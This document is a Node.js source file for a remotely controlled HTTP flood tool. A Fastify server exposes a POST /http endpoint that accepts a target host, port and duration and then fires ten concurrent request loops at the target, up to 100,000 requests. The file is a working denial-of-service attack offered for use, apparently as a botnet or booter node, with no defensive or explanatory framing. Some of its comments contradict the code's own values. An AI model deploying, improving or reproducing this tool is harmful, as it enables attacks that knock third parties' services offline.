const fastify = require('fastify')();
const axios = require('axios');
const http = require('http');
/**
 * Initiates an HTTP flood against a specified URL with a defined request interval.
 * 
 * @param {string} url - The target URL for the flood.
 * @param {number} timeout - The interval in milliseconds between each request.
 * @param {number} [concurrentRequests=1] - Number of concurrent requests. Default is 1.
 * @param {number} [totalRequests=Infinity] - Total number of requests to make. Default is infinite.
 * @returns {Promise<void>}
 */
const FloodHttp = (url, timeout, concurrentRequests = 1, totalRequests = Infinity) => {
    let completed = 0;
    let active = true;

    const makeRequest = async () => {
        if (!active) return;
        try {
            await axios.get(url, { timeout: 5000 }); // 5-second timeout per request
            console.log(`Request completed. Total: ${++completed}`);
            if (completed < totalRequests) {
                setTimeout(makeRequest, timeout);
            } else {
                active = false;
                console.log('Flood completed as total requests reached.');
            }
        } catch (error) {
            console.error('Error making request:', error.message);
            setTimeout(makeRequest, timeout * 2);
        }
    };

    for (let i = 0; i < concurrentRequests; i++) {
        makeRequest();
    }

    return {
        stop: () => {
            active = false;
            console.log('Flood stopped manually.');
        }
    };
};

fastify.post('/http', async (request, reply) => {
    try {
        const { host, port, time } = request.body;
        
        // **CORRECTIONS & VALIDATIONS**
        if (!host ||!port ||!time) {
            return 'Missing required parameters: host, port, or time';
        }

        if (typeof host!== 'string' || typeof port!== 'number' || typeof time!== 'number') {
            return 'Invalid parameter types. Expected: host (string), port (number), time (number)';
        }

        // **CONSTRUCT FULL URL**
        const fullUrl = `http://${host}:${port}`; // Assuming HTTP protocol

        // **EXECUTE FLOOD WITH VALIDATIONS**
        if (time <= 0 || port < 0 || port > 65535) {
            return reply.badRequest('Invalid time or port range. Time must be > 0, Port must be between 0 and 65535.');
        }

        console.log(`Initiating HTTP flood against ${fullUrl} for ${time} seconds...`);
        const flood = FloodHttp(fullUrl, 15, 10, 100000); // 10 concurrent requests, 100ms apart, up to 1000 requests
        setTimeout(() => {
            flood.stop();
            console.log('HTTP flood stopped as per requested duration.');
        }, time * 1000);

        return { message: `HTTP Flood initiated against ${fullUrl} for ${time} seconds.` };
    } catch (error) {
        console.error('Error handling request:', error);
        return { message: 'Error initiating task', error: error.message };
    }
});

const startServer = async () => {
    try {
        await fastify.listen(process.env.PORT, '0.0.0.0');
        console.log(`server listening on ${fastify.server.address().port}`);
    } catch (err) {
        fastify.log.error(err);
        process.exit(1);
    }
};

startServer();